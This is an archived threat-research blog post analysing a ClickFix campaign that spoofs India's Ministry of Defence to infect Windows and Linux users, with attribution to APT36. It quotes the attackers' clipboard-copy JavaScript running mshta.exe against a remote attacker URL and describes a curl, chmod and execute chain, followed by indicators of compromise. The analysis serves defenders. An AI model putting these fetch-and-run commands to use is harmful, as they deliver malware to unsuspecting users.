---
url: "https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence"
title: "APT36-Linked ClickFix Campaign Spoofs Indian Ministry of Defence, Targets Windows & Linux Users"
captured: "2026-11-02T18:32:35Z"
via: "live"
sha256: "4f95eb98813597eff83d89d33c3afba0f869a9c1a4d47a1a7672f8ab744583da"
wayback: "https://web.archive.org/web/20260928073626/https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence"
cited_in:
  - "docs/threats/01-phishing-social-engineering.md"
---

# APT36-Linked ClickFix Campaign Spoofs Indian Ministry of Defence, Targets Windows & Linux Users

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence>
> Snapshot: <https://web.archive.org/web/20260928073626/https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence>

[PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls)

[Learn More](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls)

[Hunt.io](https://hunt.io/)

[Product](https://hunt.io/products)

[Features](https://hunt.io/features)

[OEM](https://hunt.io/oem)

[Pricing](https://hunt.io/pricing)

[About](https://hunt.io/about)

[Blog](https://hunt.io/blog)

[Login](https://portal.hunt.io/sign-in)

[Get a Demo](https://hunt.io/get-started)

To embed a website or widget, add it to the properties panel.

[PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls)

[Learn More](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls)

[Hunt.io](https://hunt.io/)

[Product](https://hunt.io/products)

[Features](https://hunt.io/features)

[OEM](https://hunt.io/oem)

[Pricing](https://hunt.io/pricing)

[About](https://hunt.io/about)

[Blog](https://hunt.io/blog)

[Login](https://portal.hunt.io/sign-in)

[Get a Demo](https://hunt.io/get-started)

To embed a website or widget, add it to the properties panel.

[PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls)

[Learn More](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls)

[Hunt.io](https://hunt.io/)

To embed a website or widget, add it to the properties panel.

[Home](https://hunt.io/)

[Blog](https://hunt.io/blog)

APT36-Style ClickFix Attack Spoofs Indian Ministry to Target Windows & Linux

# APT36-Style ClickFix Attack Spoofs Indian Ministry to Target Windows & Linux

Published on

May 5, 2025

TABLE OF CONTENTS

[Initial Landing Page: Fake Ministry Press Release Portal](https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence#Initial_Landing_Page_Fake_Ministry_Press_Release_Portal)[ClickFix Technique Observations](https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence#ClickFix_Technique_Observations)[Final thoughts](https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence#Final_thoughts)

Threat actors continue to adopt recognizable branding and official imagery to lower suspicion and facilitate malware execution. Infrastructure spoofing India's Ministry of Defence was recently observed delivering cross-platform malware through a ClickFix-style infection chain. The site mimicked government press releases, staged payloads through a possibly compromised .in domain, and used visual deception to appear credible during execution.

This activity mirrors patterns seen in other ClickFix cases-reuse of public-sector branding, staging [malware in web asset directories](https://hunt.io/blog/hunting-and-collecting-malware-via-open-directories-part-1), and targeting Windows and Linux to maximize effectiveness.

## Initial Landing Page: Fake Ministry Press Release Portal

While surveying domains imitating official government websites, Hunt.io identified email.gov.in.drdosurvey[.]info serving content spoofing India's Ministry of Defence. Visiting the site in a browser opened a page mimicking the Ministry's official press release archive, with structure and layout closely modeled on the legitimate portal.

A comparison of the URL paths is below:

```
Legitimate: /index.php/en/press-releases-ministry-defence-0\
Malicious:  /content/press-releases-ministry-defence-0.html

Copy

```

The threat actor(s) attempted to recreate the Ministry's public document archive, typically listing monthly press releases from September 2023 through April 2025. However, on the cloned page, only a single link-corresponding to March 2025-was active, while all other months displayed a static "No Data" status.

Figure 1: Page screenshot showing only March 2025 link.

Reviewing the cloned portal's source code revealed that the page had been created using HTTrack, a publicly available website copying tool. Metadata embedded within the HTML suggested the cloning occurred in early March 2025.

Figure 2: Source code snippet showing HTTrack metadata

Threat actors attempted to recreate the Ministry's public document archive, typically listing monthly press releases from September 2023 through April 2025. However, on the cloned portal, only a single link-corresponding to March 2025-was active, while all other months displayed a static "No Data" status.

## ClickFix Technique Observations

Clicking the only active link on the cloned press release portal-labeled March 2025-initiates a ClickFix-style social engineering flow. The user is directed to one of two PHP pages depending on their operating system:

```
Windows: /captcha/windows.php
Linux:   /captcha/linux.php

Copy

```

This section focuses on the Linux-specific flow, which appears less mature and may still be under development.

### Linux Flow: CAPTCHA Lure and Shell Command Execution

The Linux CAPTCHA page presents a minimal interface with a single blue button labeled, "I'm not a rebot"-a misspelling possibly either a typo or introduced intentionally to avoid automated scanning for similar web pages.

Figure 3: CAPTCHA page showing "I'm not a rebot" button

Upon clicking the button, a shell command is silently copied to the user's clipboard. If pasted and executed in a terminal, the command downloads a shell script named mapeal.sh from  https://trade4wealth[.]in/admin/assets/js/, grants it execute permissions via chmod +x, and then runs it immediately. The domain used for payload delivery-  trade4wealth[.]in-is assessed as a likely compromised or abandoned asset, repurposed as part of the delivery infrastructure.

Immediately after copying the payload command, the user is redirected to  linux-guide.php, which displays a verification overlay and a set of instructions:

```
1. Press ALT + F2
2. Press CTRL + V
3. Press Enter

Copy

```

Figure 4: linux-guide.php showing fake CAPTCHA and "Verificaton Steps"

The page presents the next phase of the ClickFix flow: a spoofed CAPTCHA overlay paired with step-by-step instructions designed to trick users into executing clipboard-based shell commands.

Behind the overlay, the background appears to be a static image containing a faint watermark from PCRisk, a legitimate cybersecurity information site that publishes malware removal guides and threat analysis. The inclusion of this image may be intended to mimic the appearance of a trusted security interface and reduce suspicion during execution.

As of this writing, the Linux payload (  mapeal.sh) performs no observable malicious behavior. The script downloads a JPEG image from the same  trade4wealth[.]in directory and opens it in the background. No additional activity, such as persistence mechanisms, lateral movement, or outbound communication, was observed during execution.

### Windows Flow: FOUO Warning and mshta-Based Payload Delivery

On Windows systems, clicking the March 2025 link redirects the user to  /captcha/windows.php, which displays a full-screen overlay mimicking a government-style disclosure warning labeled "For Official Use Only (FOUO)." The background image appears to be a blurred capture of the official  yoga.ayush.gov[.]in portal, a legitimate website operated by India's Ministry of AYUSH to promote yoga and wellness programs.

Figure 5: windows.php page with FOUO warning and blurred AYUSH site in the background.

After clicking the Continue button, the user is served a second-stage ClickFix sequence. A JavaScript function silently copies a malicious command to the clipboard, instructing the user to paste and execute it in the terminal. The payload is executed via mshta.exe, invoking a remote script hosted on the attacker-controlled infrastructure:

```
const calcPath = "C:\\Windows\\System32\\mshta.exe https://trade4wealth[.]in/admin/assets/css/default/index.php"; navigator.clipboard.writeText(calcPath)

Copy

```

Figure 6: JavaScript source showing mshta.exe payload and clipboard copy logic.

When accessed directly, index.php redirects to a second-stage payload at:

```
https://trade4wealth[.]in/admin/assets/css/default/sysinte.hta

Copy

```

This HTA file contains hundreds of lines of obfuscated JavaScript using hexadecimal escape sequences, designed to hinder static analysis.

Figure 7: Snippet of sysinte.hta.

Dynamic analysis of the decoded payload revealed a .NET-based loader, which initiates outbound connections to the IP address  185.117.90[.]212. This host also resolves to a spoofed subdomain:  email.gov.in.avtzyu[.]store.

While the malware executes in the background, the user is shown a decoy document-an apparently legitimate press release themed around the Indian Ministry of Defence. The PDF appears to have been cloned directly from the actual press release portal, likely intended to reinforce the illusion of legitimacy.

Figure 8: Decoy PDF shown to the victim during malware execution.

### Operator Traits and Attribution

Several observable traits across this campaign can help defenders [identify related malicious infrastructure](https://hunt.io/blog/practical-guide-unconvering-malicious-infrastructure) and anticipate future staging activity:

-

Domains mimicking Indian government subdomains, particularly variations of  email.gov[.]in, appended to attacker-controlled parent domains (e.g.,  drdosurvey[.]info,  avtzyu[.]store).

-

Use of Namecheap as a registrar, and registrar-servers[.]com nameservers-both commonly abused in malicious activity.

-

HTA payloads staged deep in URL paths masquerading as benign directories.

-

Spelling anomalies, such as "I'm not a rebot" and "officia use only", may reflect a deliberate attempt to bypass pattern-based detection or user familiarity.

-

Cross-platform delivery using clipboard-based execution on both Windows (mshta.exe) and Linux (curl + chmod + bash) further supports staging flexibility.

### Attribution Assessment

While attribution remains unconfirmed, the tradecraft observed in this campaign-use of [government-themed lure content](https://www.seqrite.com/blog/double-action-triple-infection-and-a-new-rat-sidecopys-persistent-targeting-of-indian-defence/), HTA-based delivery, decoy documents, and operational targeting of Indian government infrastructure-is consistent with historic activity attributed to APT36 (also known as Transparent Tribe).

APT36 is a Pakistan-aligned threat actor known for:

-

Longstanding focus on Indian government, military, and diplomatic targets.

-

Repeated use of .NET-based malware, HTA delivery, and cloned login or press release content.

-

Infrastructure that frequently includes typosquatting, misuse of legitimate services, and publicly visible scripting errors.

Based on these overlaps, this activity is assessed with medium confidence to align with APT36's broader targeting and operational patterns.

## Final thoughts

This campaign reflects a familiar playbook with subtle adjustments: cloned government branding, decoy files, and low-friction execution paths tailored to each operating system. While not technically advanced, the operators showed clear intent in crafting believable lures and maintaining control over payload delivery across different platforms.

The inclusion of press release theming, clipboard-based execution, and reused security imagery fits a pattern seen in prior APT36 activity. If not definitive, it's a strong indication that known actors are continuing to test ClickFix-style techniques in new contexts.

For defenders, the takeaway isn't tied to a single technique-it's the way familiar methods are being reused in slightly new combinations. Look for signs like clipboard-delivered commands, spoofed government subdomains, shallow clones of trusted sites, and payloads staged under common web folders. These small patterns, when seen together, often reveal a larger campaign taking shape. We've observed similar patterns in our[previous research on ClickFix infrastructure](https://hunt.io/blog/clickfix-pages-proactive-threat-hunting), where early-stage domains showed many of the same traits.

### APT36-Like Infrastructure Network Observables and Indicators of Compromise (IOCs)

| IP Address | Domain(s) | Hosting Company | Location

| 192.64.118[.]76 | email[.]gov[.]in[.]drdosurvey[.]info | Namecheap, Inc. (contains parked domains) | US

| 185.117.90[.]212 | email[.]gov[.]in[.]avtzyu[.]store | HZ Hosting Ltd | NL

### APT36-Like Infrastructure Host Observables and Indicators of Compromise (IOCs)

| Filename | SHA-256 | Misc.

| sysinte.hta | 7087e5f768acaad83550e6b1b9696477089d2797e8f6e3f9a9d69c77177d030e | HTA file associated with the Windows ClickFix technique.

TABLE OF CONTENTS

[Initial Landing Page: Fake Ministry Press Release Portal](https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence#Initial_Landing_Page_Fake_Ministry_Press_Release_Portal)[ClickFix Technique Observations](https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence#ClickFix_Technique_Observations)[Final thoughts](https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence#Final_thoughts)

Threat actors continue to adopt recognizable branding and official imagery to lower suspicion and facilitate malware execution. Infrastructure spoofing India's Ministry of Defence was recently observed delivering cross-platform malware through a ClickFix-style infection chain. The site mimicked government press releases, staged payloads through a possibly compromised .in domain, and used visual deception to appear credible during execution.

This activity mirrors patterns seen in other ClickFix cases-reuse of public-sector branding, staging [malware in web asset directories](https://hunt.io/blog/hunting-and-collecting-malware-via-open-directories-part-1), and targeting Windows and Linux to maximize effectiveness.

## Initial Landing Page: Fake Ministry Press Release Portal

While surveying domains imitating official government websites, Hunt.io identified email.gov.in.drdosurvey[.]info serving content spoofing India's Ministry of Defence. Visiting the site in a browser opened a page mimicking the Ministry's official press release archive, with structure and layout closely modeled on the legitimate portal.

A comparison of the URL paths is below:

```
Legitimate: /index.php/en/press-releases-ministry-defence-0\
Malicious:  /content/press-releases-ministry-defence-0.html

Copy

```

The threat actor(s) attempted to recreate the Ministry's public document archive, typically listing monthly press releases from September 2023 through April 2025. However, on the cloned page, only a single link-corresponding to March 2025-was active, while all other months displayed a static "No Data" status.

Figure 1: Page screenshot showing only March 2025 link.

Reviewing the cloned portal's source code revealed that the page had been created using HTTrack, a publicly available website copying tool. Metadata embedded within the HTML suggested the cloning occurred in early March 2025.

Figure 2: Source code snippet showing HTTrack metadata

Threat actors attempted to recreate the Ministry's public document archive, typically listing monthly press releases from September 2023 through April 2025. However, on the cloned portal, only a single link-corresponding to March 2025-was active, while all other months displayed a static "No Data" status.

## ClickFix Technique Observations

Clicking the only active link on the cloned press release portal-labeled March 2025-initiates a ClickFix-style social engineering flow. The user is directed to one of two PHP pages depending on their operating system:

```
Windows: /captcha/windows.php
Linux:   /captcha/linux.php

Copy

```

This section focuses on the Linux-specific flow, which appears less mature and may still be under development.

### Linux Flow: CAPTCHA Lure and Shell Command Execution

The Linux CAPTCHA page presents a minimal interface with a single blue button labeled, "I'm not a rebot"-a misspelling possibly either a typo or introduced intentionally to avoid automated scanning for similar web pages.

Figure 3: CAPTCHA page showing "I'm not a rebot" button

Upon clicking the button, a shell command is silently copied to the user's clipboard. If pasted and executed in a terminal, the command downloads a shell script named mapeal.sh from  https://trade4wealth[.]in/admin/assets/js/, grants it execute permissions via chmod +x, and then runs it immediately. The domain used for payload delivery-  trade4wealth[.]in-is assessed as a likely compromised or abandoned asset, repurposed as part of the delivery infrastructure.

Immediately after copying the payload command, the user is redirected to  linux-guide.php, which displays a verification overlay and a set of instructions:

```
1. Press ALT + F2
2. Press CTRL + V
3. Press Enter

Copy

```

Figure 4: linux-guide.php showing fake CAPTCHA and "Verificaton Steps"

The page presents the next phase of the ClickFix flow: a spoofed CAPTCHA overlay paired with step-by-step instructions designed to trick users into executing clipboard-based shell commands.

Behind the overlay, the background appears to be a static image containing a faint watermark from PCRisk, a legitimate cybersecurity information site that publishes malware removal guides and threat analysis. The inclusion of this image may be intended to mimic the appearance of a trusted security interface and reduce suspicion during execution.

As of this writing, the Linux payload (  mapeal.sh) performs no observable malicious behavior. The script downloads a JPEG image from the same  trade4wealth[.]in directory and opens it in the background. No additional activity, such as persistence mechanisms, lateral movement, or outbound communication, was observed during execution.

### Windows Flow: FOUO Warning and mshta-Based Payload Delivery

On Windows systems, clicking the March 2025 link redirects the user to  /captcha/windows.php, which displays a full-screen overlay mimicking a government-style disclosure warning labeled "For Official Use Only (FOUO)." The background image appears to be a blurred capture of the official  yoga.ayush.gov[.]in portal, a legitimate website operated by India's Ministry of AYUSH to promote yoga and wellness programs.

Figure 5: windows.php page with FOUO warning and blurred AYUSH site in the background.

After clicking the Continue button, the user is served a second-stage ClickFix sequence. A JavaScript function silently copies a malicious command to the clipboard, instructing the user to paste and execute it in the terminal. The payload is executed via mshta.exe, invoking a remote script hosted on the attacker-controlled infrastructure:

```
const calcPath = "C:\\Windows\\System32\\mshta.exe https://trade4wealth[.]in/admin/assets/css/default/index.php"; navigator.clipboard.writeText(calcPath)

Copy

```

Figure 6: JavaScript source showing mshta.exe payload and clipboard copy logic.

When accessed directly, index.php redirects to a second-stage payload at:

```
https://trade4wealth[.]in/admin/assets/css/default/sysinte.hta

Copy

```

This HTA file contains hundreds of lines of obfuscated JavaScript using hexadecimal escape sequences, designed to hinder static analysis.

Figure 7: Snippet of sysinte.hta.

Dynamic analysis of the decoded payload revealed a .NET-based loader, which initiates outbound connections to the IP address  185.117.90[.]212. This host also resolves to a spoofed subdomain:  email.gov.in.avtzyu[.]store.

While the malware executes in the background, the user is shown a decoy document-an apparently legitimate press release themed around the Indian Ministry of Defence. The PDF appears to have been cloned directly from the actual press release portal, likely intended to reinforce the illusion of legitimacy.

Figure 8: Decoy PDF shown to the victim during malware execution.

### Operator Traits and Attribution

Several observable traits across this campaign can help defenders [identify related malicious infrastructure](https://hunt.io/blog/practical-guide-unconvering-malicious-infrastructure) and anticipate future staging activity:

-

Domains mimicking Indian government subdomains, particularly variations of  email.gov[.]in, appended to attacker-controlled parent domains (e.g.,  drdosurvey[.]info,  avtzyu[.]store).

-

Use of Namecheap as a registrar, and registrar-servers[.]com nameservers-both commonly abused in malicious activity.

-

HTA payloads staged deep in URL paths masquerading as benign directories.

-

Spelling anomalies, such as "I'm not a rebot" and "officia use only", may reflect a deliberate attempt to bypass pattern-based detection or user familiarity.

-

Cross-platform delivery using clipboard-based execution on both Windows (mshta.exe) and Linux (curl + chmod + bash) further supports staging flexibility.

### Attribution Assessment

While attribution remains unconfirmed, the tradecraft observed in this campaign-use of [government-themed lure content](https://www.seqrite.com/blog/double-action-triple-infection-and-a-new-rat-sidecopys-persistent-targeting-of-indian-defence/), HTA-based delivery, decoy documents, and operational targeting of Indian government infrastructure-is consistent with historic activity attributed to APT36 (also known as Transparent Tribe).

APT36 is a Pakistan-aligned threat actor known for:

-

Longstanding focus on Indian government, military, and diplomatic targets.

-

Repeated use of .NET-based malware, HTA delivery, and cloned login or press release content.

-

Infrastructure that frequently includes typosquatting, misuse of legitimate services, and publicly visible scripting errors.

Based on these overlaps, this activity is assessed with medium confidence to align with APT36's broader targeting and operational patterns.

## Final thoughts

This campaign reflects a familiar playbook with subtle adjustments: cloned government branding, decoy files, and low-friction execution paths tailored to each operating system. While not technically advanced, the operators showed clear intent in crafting believable lures and maintaining control over payload delivery across different platforms.

The inclusion of press release theming, clipboard-based execution, and reused security imagery fits a pattern seen in prior APT36 activity. If not definitive, it's a strong indication that known actors are continuing to test ClickFix-style techniques in new contexts.

For defenders, the takeaway isn't tied to a single technique-it's the way familiar methods are being reused in slightly new combinations. Look for signs like clipboard-delivered commands, spoofed government subdomains, shallow clones of trusted sites, and payloads staged under common web folders. These small patterns, when seen together, often reveal a larger campaign taking shape. We've observed similar patterns in our[previous research on ClickFix infrastructure](https://hunt.io/blog/clickfix-pages-proactive-threat-hunting), where early-stage domains showed many of the same traits.

### APT36-Like Infrastructure Network Observables and Indicators of Compromise (IOCs)

| IP Address | Domain(s) | Hosting Company | Location

| 192.64.118[.]76 | email[.]gov[.]in[.]drdosurvey[.]info | Namecheap, Inc. (contains parked domains) | US

| 185.117.90[.]212 | email[.]gov[.]in[.]avtzyu[.]store | HZ Hosting Ltd | NL

### APT36-Like Infrastructure Host Observables and Indicators of Compromise (IOCs)

| Filename | SHA-256 | Misc.

| sysinte.hta | 7087e5f768acaad83550e6b1b9696477089d2797e8f6e3f9a9d69c77177d030e | HTA file associated with the Windows ClickFix technique.

Related Posts

Related Posts

Related Posts

[Threat Research](https://hunt.io/blog/clickfix-pages-proactive-threat-hunting)

Apr 3, 2025

•

9

min read

### [Identifying ClickFix Exploits: A Case Study in Proactive Threat Hunting](https://hunt.io/blog/clickfix-pages-proactive-threat-hunting)

[Read Article](https://hunt.io/blog/clickfix-pages-proactive-threat-hunting)

Threat Research

[Threat Research](https://hunt.io/blog/proxylogon-and-proxyshell-used-to-target-government-mail-servers-in-asia-europe-and-south-america)

Jul 2, 2024

•

9

min read

### [ProxyLogon and ProxyShell Used to Target Government Mail Servers in Asia, Europe, and South America](https://hunt.io/blog/proxylogon-and-proxyshell-used-to-target-government-mail-servers-in-asia-europe-and-south-america)

[Read Article](https://hunt.io/blog/proxylogon-and-proxyshell-used-to-target-government-mail-servers-in-asia-europe-and-south-america)

Threat Research

[Threat Research](https://hunt.io/blog/smokeloader-malware-found-in-open-directories-targeting-ukraine-s-auto-banking-industries)

Feb 6, 2025

•

7

min read

### [SmokeLoader Malware Found in Open Directories Targeting Ukraine’s Auto & Banking Industries](https://hunt.io/blog/smokeloader-malware-found-in-open-directories-targeting-ukraine-s-auto-banking-industries)

[Read Article](https://hunt.io/blog/smokeloader-malware-found-in-open-directories-targeting-ukraine-s-auto-banking-industries)

Threat Research

https://hunt.io/

[Threat Hunting Platform](https://hunt.io/)

https://x.com/Huntio?t=tNAyMYy3rMSrq6u0XIpZRg&s=09https://www.linkedin.com/company/hunt-intelligence-inc/

©2026 Hunt Intelligence, Inc.

Explore

[Product](https://hunt.io/products)

[Features](https://hunt.io/features)

[OEM Partners](https://hunt.io/oem)

[Pricing](https://hunt.io/pricing)

[Integrations](https://hunt.io/integrations)

Resources

[Blog](https://hunt.io/blog)

[Change log](https://hunt.io/changelog)

[Support Docs](https://hunt.io/support)

[API v3 Docs](https://a.hunt.io/)

[Service Status](https://status.hunt.io/)

[Malware Families](https://hunt.io/malware-families)

[Threat Actors](https://hunt.io/threat-actors)

[Glossary](https://hunt.io/glossary)

Company

[About Us](https://hunt.io/about)

[Use Cases](https://hunt.io/use-cases)

[Testimonials](https://hunt.io/reviews)

[Branding](https://hunt.io/logo-and-branding)

[Contact Us](https://hunt.io/contact-us)

[Terms and conditions](https://hunt.io/terms-of-service)

[Privacy Policy](https://hunt.io/privacy-policy)

https://hunt.io/

[Threat Hunting Platform](https://hunt.io/)

https://x.com/Huntio?t=tNAyMYy3rMSrq6u0XIpZRg&s=09https://www.linkedin.com/company/hunt-intelligence-inc/

©2026 Hunt Intelligence, Inc.

Explore

[Product](https://hunt.io/products)

[Features](https://hunt.io/features)

[OEM Partners](https://hunt.io/oem)

[Pricing](https://hunt.io/pricing)

[Integrations](https://hunt.io/integrations)

Resources

[Blog](https://hunt.io/blog)

[Change log](https://hunt.io/changelog)

[Support Docs](https://hunt.io/support)

[API v3 Docs](https://a.hunt.io/)

[Service Status](https://status.hunt.io/)

[Malware Families](https://hunt.io/malware-families)

[Threat Actors](https://hunt.io/threat-actors)

[Glossary](https://hunt.io/glossary)

Company

[About Us](https://hunt.io/about)

[Use Cases](https://hunt.io/use-cases)

[Testimonials](https://hunt.io/reviews)

[Branding](https://hunt.io/logo-and-branding)

[Contact Us](https://hunt.io/contact-us)

[Terms and conditions](https://hunt.io/terms-of-service)

[Privacy Policy](https://hunt.io/privacy-policy)

https://hunt.io/

[Threat Hunting Platform](https://hunt.io/)

https://x.com/Huntio?t=tNAyMYy3rMSrq6u0XIpZRg&s=09https://www.linkedin.com/company/hunt-intelligence-inc/

Explore

[Product](https://hunt.io/products)

[Features](https://hunt.io/features)

[OEM Partners](https://hunt.io/oem)

[Pricing](https://hunt.io/pricing)

[Integrations](https://hunt.io/integrations)

Resources

[Blog](https://hunt.io/blog)

[Change log](https://hunt.io/changelog)

[Support Docs](https://hunt.io/support)

[API v3 Docs](https://a.hunt.io/)

[Service Status](https://status.hunt.io/)

[Malware Families](https://hunt.io/malware-families)

[Threat Actors](https://hunt.io/threat-actors)

[Glossary](https://hunt.io/glossary)

Company

[About Us](https://hunt.io/about)

[Use Cases](https://hunt.io/use-cases)

[Testimonials](https://hunt.io/reviews)

[Branding](https://hunt.io/logo-and-branding)

[Contact Us](https://hunt.io/contact-us)

[Terms and conditions](https://hunt.io/terms-of-service)

[Privacy Policy](https://hunt.io/privacy-policy)

©2025 Hunt Intelligence, Inc.
